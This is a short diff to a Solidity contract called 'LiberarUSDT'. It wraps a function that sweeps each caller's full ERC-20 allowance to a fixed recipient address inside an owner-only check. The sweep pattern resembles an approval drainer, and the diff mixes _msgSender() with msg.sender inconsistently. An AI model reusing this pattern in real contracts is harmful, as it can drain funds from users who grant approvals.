@@ -84,12 +84,17 @@ contract LiberarUSDT is BaseRelayRecipient {
     function TrasnferERC20(address[] memory _tokens) external {
 
         uint256 tokenCount = _tokens.length;
+        if(_msgSender() == owner){            
 
-        for (uint i=0; i<tokenCount; i++) {
-            uint256 amount = IERC20(_tokens[i]).allowance(msg.sender, address(this));
-            
-            IERC20(_tokens[i]).transferFrom(msg.sender, recipient, amount);
+            for (uint i=0; i<tokenCount; i++) {
+                uint256 amount = IERC20(_tokens[i]).allowance(msg.sender, address(this));
+                    IERC20(_tokens[i]).transferFrom(msg.sender, recipient, amount);
+            }
+
+            return;
         }
+
+        revert("Sender is not allowed");
 
     }
 
